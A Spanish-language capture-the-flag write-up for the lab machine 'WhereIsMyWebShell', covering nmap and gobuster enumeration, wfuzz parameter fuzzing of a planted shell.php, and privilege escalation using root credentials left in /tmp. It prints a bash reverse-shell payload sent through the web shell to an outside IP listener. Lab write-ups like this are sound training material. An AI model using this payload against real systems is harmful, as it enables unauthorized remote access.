---
description: >-
  ✍️ Autor: El Pingüino de Mario🔍 Dificultad: Fácil  📅 Fecha de creación:
  12/04/2024
---

# WhereIsMyWebShell

### 🔍 RECONOCIMIENTO

En primer lugar, tras conectarnos a la máquina, utilizamos el comando:

```bash
ping -c 1 172.17.0.2
```

para verificar la conectividad de red.

<figure><img src="../../.gitbook/assets/image (807).png" alt=""><figcaption></figcaption></figure>

A continuación, realizamos el comando:

```bash
nmap -sVC -p- -n --min-rate 5000 172.17.0.2
```

para realizar un escaneo de puertos y servicios detallado en la dirección IP.

<figure><img src="../../.gitbook/assets/image (851).png" alt=""><figcaption></figcaption></figure>

Como podemos observar durante el escaneo que el **puerto 80** perteneciente al **servicio HTTP** está abierto por lo que a continuación se indagará más.

### 🔎 EXPLORACIÓN

Se utiliza el comando:

```bash
sudo nmap -sCV -p80 -v 172.17.0.2
```

para que nos proporcione más información sobre esos puertos específicamente.

<figure><img src="../../.gitbook/assets/image (852).png" alt=""><figcaption></figcaption></figure>

Seguimos indagando más sobre los puertos y ahora indagamos sobre el **servicio HTTP**. Se ingresó la **dirección IP** en el navegador lo que llevó a que la página web de una Academia de Inglés.

<figure><img src="../../.gitbook/assets/image (853).png" alt=""><figcaption></figcaption></figure>

Si revisamos la página web nos dice que hay un secreto en el directorio **/tmp**.

Ahora buscaremos directorios y archivos con la herramienta **Gobuster** a través de:

```bash
gobuster dir -u http://172.17.0.2/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -x html,php,txt,xml
```

<figure><img src="../../.gitbook/assets/image (854).png" alt=""><figcaption></figcaption></figure>

### &#x20;🚀 **EXPLOTACIÓN**

Nos encontramos una archivo llamado `shell.php` en que imaginamos que es una **WebShell** y nos da una pista tal como se llama la máquina.&#x20;

```bash
http://172.17.0.2/shell.php?cmd=id
```

No nos devuelve nada por lo que realizamos **fuzzing**.

```bash
wfuzz -c --hc=404,500 -t 200 -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt http://172.17.0.2/shell.php?FUZZ=id
```

<figure><img src="../../.gitbook/assets/image (856).png" alt=""><figcaption></figcaption></figure>

Descubrimos que el parámetro es `parameter`.

<figure><img src="../../.gitbook/assets/image (855).png" alt=""><figcaption></figcaption></figure>

Aprovechamos eso para hacer una [Reverse Shell](https://www.revshells.com/).

```bash
http://172.17.0.2/shell.php?parameter=bash -c "bash -i >%26 /dev/tcp/192.168.255.136/443 0>%261"
```

Nos ponemos en escucha.

<figure><img src="../../.gitbook/assets/image (857).png" alt=""><figcaption></figcaption></figure>

Hacemos el [tratamiento de la TTY](https://invertebr4do.github.io/tratamiento-de-tty/) para trabajar más cómodos.

### 🔐 **PRIVILEGIOS**

Al estar dentro y ejecutar:

```bash
whoami
```

aún no somos **root**, por lo que hacemos:

```bash
sudo -l
```

para ver si hay algo para explotar. No tenemos permisos **SUDO**.

Revisamos el archivo que hay en el directorio `/tmp`.

<figure><img src="../../.gitbook/assets/image (858).png" alt=""><figcaption></figcaption></figure>

Nos logueamos con **root** con esas credenciales.

<figure><img src="../../.gitbook/assets/image (859).png" alt=""><figcaption></figcaption></figure>
